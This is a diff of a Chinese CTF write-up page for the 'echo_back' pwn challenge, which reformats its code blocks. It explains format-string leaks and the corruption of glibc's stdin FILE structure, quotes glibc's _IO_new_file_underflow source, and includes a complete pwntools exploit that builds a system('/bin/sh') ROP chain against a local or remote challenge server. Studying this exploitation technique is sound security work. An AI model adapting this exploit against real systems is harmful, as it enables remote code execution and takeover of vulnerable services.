@@ -170,92 +170,8 @@
 <p><img src="https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png" alt="20200414205959.png"></p>
 <p>根据调试，分别输入<em>%14$p</em> 与<em>%19$p</em> 可以得到。当然其实我们还需要泄露一个返回地址<font color=red>所在位置</font>，以便最后为了改写。注意，<font color=red>因为我们能泄露的是地址的内容而不是地址</font>，所以这里我们只能选择泄露rbp内容，[rbp]+8处存放main函数返回地址。可以输入<em>%12$p</em> 得到。从而得到stdin地址。</p>
 <h3 id="攻击stdin结构"><a href="#攻击stdin结构" class="headerlink" title="攻击stdin结构"></a>攻击<code>stdin</code>结构</h3><p>由scanf()源码可知，它通过stdin的FILE结构暂存输入流，然后输入到指定位置。下面是scanf()的核心实现函数_IO_new_file_underflow()源码：</p>
-<pre><code class="c">int _IO_new_file_underflow (_IO_FILE *fp)
-{
-  _IO_ssize_t count;
-#if 0
-  /* SysV does not make this test; take it out for compatibility */
-  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
-    return (EOF);
-#endif
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/*!!!!!*/</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)              </span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;        </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn't</span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="comment">/*!!!!!*/</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,                 </span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);         </span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">/*!!!!!*/</span></span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">     unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  if (fp-&gt;_flags &amp; _IO_NO_READS)
-    {
-      fp-&gt;_flags |= _IO_ERR_SEEN;
-      __set_errno (EBADF);
-      return EOF;
-    }
-  /*!!!!!*/
-  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)              
-    return *(unsigned char *) fp-&gt;_IO_read_ptr;        
-  if (fp-&gt;_IO_buf_base == NULL)
-    {
-      /* Maybe we already have a push back pointer.  */
-      if (fp-&gt;_IO_save_base != NULL)
-    {
-      free (fp-&gt;_IO_save_base);
-      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
-    }
-      _IO_doallocbuf (fp);
-    }
-
-  /* Flush all line buffered files before reading. */
-  /* FIXME This can/should be moved to genops ?? */
-  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))
-    {
-#if 0
-      _IO_flush_all_linebuffered ();
-#else
-      /* We used to flush all line-buffered stream.  This really isn&#39;t
-     required by any standard.  My recollection is that
-     traditional Unix systems did this for stdout.  stderr better
-     not be line buffered.  So we do just that here
-     explicitly.  --drepper */
-      _IO_acquire_lock (_IO_stdout);
-
-      if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
-      == (_IO_LINKED | _IO_LINE_BUF))
-    _IO_OVERFLOW (_IO_stdout, EOF);
-
-      _IO_release_lock (_IO_stdout);
-#endif
-    }
-
-  _IO_switch_to_get_mode (fp);
-
-  /* This is very tricky. We have to adjust those
-     pointers before we call _IO_SYSREAD () since
-     we may longjump () out while waiting for
-     input. Those pointers may be screwed up. H.J. */
-  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
-  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
-  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
-    = fp-&gt;_IO_buf_base;
-  /*!!!!!*/
-  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,                 
-               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);         
-  if (count &lt;= 0)
-    {
-      if (count == 0)
-    fp-&gt;_flags |= _IO_EOF_SEEN;
-      else
-    fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;
-  }
-    /*!!!!!*/
-  fp-&gt;_IO_read_end += count;
-  if (count == 0)
-    {
-      /* If a stream is read to EOF, the calling application may switch active
-     handles.  As a result, our offset cache would no longer be valid, so
-     unset it.  */
-      fp-&gt;_offset = _IO_pos_BAD;
-      return EOF;
-    }
-  if (fp-&gt;_offset != _IO_pos_BAD)
-    _IO_pos_adjust (fp-&gt;_offset, count);
-  return *(unsigned char *) fp-&gt;_IO_read_ptr;
-}
-</code></pre>
 <p>注意其中<code>/*!!!!!*/</code>标识的三处是我们攻击FILE结构时需要注意的地方</p>
 <blockquote>
 <p>当stdin-&gt;_IO_read_ptr大于等于stdin-&gt;_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin-&gt;_IO_buf_base处读入stdin-&gt;_IO_buf_end - stdin-&gt;_IO_buf_base个字节，然后更新stdin-&gt;_IO_read_end的值</p>
@@ -273,83 +189,8 @@
 <p>但我们还是高兴得太早了，仔细看上图<code>stdin-&gt;_IO_read_ptr</code>显然已经小于<code>stdin-&gt;_IO_read_end</code>了！！所以我们根本没办法写入数据。</p>
 <p>最后一个拦路虎通过<code>echo_back</code>中的<code>getchar()</code> 解决，<code>getchar()</code>会将<code>stdin-&gt;_IO_read_ptr</code>加一，所以再调用<code>echo_back</code> 几次（几十次，最终即可顺利读取并getshell。</p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><code>ubuntu16.04</code>测试成功:-)</p>
-<pre><code class="python">#! /usr/bin/env python
-#coding:utf8
-from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./echo_back'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"111.198.29.45"</span>, <span class="number">38784</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo_back'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">prdi = <span class="number">0x0000000000000d93</span></span><br><span class="line">main_P_addr = <span class="number">0xc6c</span></span><br><span class="line">IO_stdin = libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_back</span><span class="params">(size, con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>, str(size))</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause</span><span class="params">(p, s = <span class="string">'pause'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基址</span></span><br><span class="line">echo_back(<span class="number">7</span>, <span class="string">'%19$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_s_m_addr = int(p.recvuntil(<span class="string">'-'</span>).split(<span class="string">'-'</span>)[<span class="number">0</span>], <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_s_m_addr)</span><br><span class="line"></span><br><span class="line">offset = libc_s_m_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + offset</span><br><span class="line">bin_sh = libc.search(<span class="string">'/bin/sh'</span>).next() + offset</span><br><span class="line">IO_stdin_addr = IO_stdin + offset</span><br><span class="line"><span class="keyword">print</span> hex(offset)</span><br><span class="line"><span class="comment"># 泄露elf基址</span></span><br><span class="line">echo_back(<span class="number">7</span>, <span class="string">'%14$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">elf_base = int(p.recvuntil(<span class="string">'-'</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0xd30</span></span><br><span class="line">prdi = prdi + elf_base</span><br><span class="line"><span class="comment"># 泄露main返回地址</span></span><br><span class="line">echo_back(<span class="number">7</span>, <span class="string">'%12$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">main_ebp = int(p.recvuntil(<span class="string">'-'</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">main_ret = main_ebp + <span class="number">0x8</span></span><br><span class="line"><span class="comment"># 修改IO_buf_base，增大输入字符数</span></span><br><span class="line">IO_buf_base = IO_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"IO_buf_base:"</span>+hex(IO_buf_base)</span><br><span class="line">name(p64(IO_buf_base))</span><br><span class="line">echo_back(<span class="number">7</span>, <span class="string">'%16$hhn'</span>)</span><br><span class="line"><span class="comment"># 输入payload，覆盖stdinFILE结构的关键参数</span></span><br><span class="line">payload = p64(IO_stdin_addr + <span class="number">131</span>) * <span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">3</span> * <span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendafter(<span class="string">'length:'</span>, payload)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># 绕过_IO_new_file_underflow中检测</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload) - <span class="number">1</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>, <span class="string">'0'</span>)</span><br><span class="line"><span class="comment"># 实现指定位置写</span></span><br><span class="line">pause(p)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'length:'</span>, p64(prdi) + p64(bin_sh) + p64(system))</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-local = 1
-if local:
-    p = process(&#39;./echo_back&#39;)
-else:
-    p = remote(&quot;111.198.29.45&quot;, 38784)
-
-debug = 1
-if debug:
-    context.log_level = &#39;debug&#39;
-
-elf = ELF(&#39;./echo_back&#39;)
-libc = ELF(&#39;./libc.so.6&#39;)
-prdi = 0x0000000000000d93
-main_P_addr = 0xc6c
-IO_stdin = libc.symbols[&#39;_IO_2_1_stdin_&#39;]
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-gdb.attach(p)
-
-def echo_back(size, con):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-    p.sendlineafter(&#39;length:&#39;, str(size))
-    p.send(con)
-
-def name(name):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;1&#39;)
-    p.sendafter(&#39;name:&#39;, name)
-
-def pause(p, s = &#39;pause&#39;):
-    return raw_input(s)
-
-# 泄露libc基址
-echo_back(7, &#39;%19$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-libc_s_m_addr = int(p.recvuntil(&#39;-&#39;).split(&#39;-&#39;)[0], 16) - 240
-print hex(libc_s_m_addr)
-
-offset = libc_s_m_addr - libc.symbols[&#39;__libc_start_main&#39;]
-system = libc.symbols[&#39;system&#39;] + offset
-bin_sh = libc.search(&#39;/bin/sh&#39;).next() + offset
-IO_stdin_addr = IO_stdin + offset
-print hex(offset)
-# 泄露elf基址
-echo_back(7, &#39;%14$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-elf_base = int(p.recvuntil(&#39;-&#39;, drop=True), 16) - 0xd30
-prdi = prdi + elf_base
-# 泄露main返回地址
-echo_back(7, &#39;%12$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-main_ebp = int(p.recvuntil(&#39;-&#39;, drop=True), 16)
-main_ret = main_ebp + 0x8
-# 修改IO_buf_base，增大输入字符数
-IO_buf_base = IO_stdin_addr + 0x8 * 7
-print &quot;IO_buf_base:&quot;+hex(IO_buf_base)
-name(p64(IO_buf_base))
-echo_back(7, &#39;%16$hhn&#39;)
-# 输入payload，覆盖stdinFILE结构的关键参数
-payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-p.sendafter(&#39;length:&#39;, payload)
-p.sendline(&#39;&#39;)
-# 绕过_IO_new_file_underflow中检测
-for i in range(0,len(payload) - 1):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-    p.sendlineafter(&#39;length:&#39;, &#39;0&#39;)
-# 实现指定位置写
-pause(p)
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-p.sendlineafter(&#39;length:&#39;, p64(prdi) + p64(bin_sh) + p64(system))
-p.sendline(&#39;&#39;)
-# getshell
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;3&#39;)
-p.interactive()</code></pre>
 
   </div>
 </article>
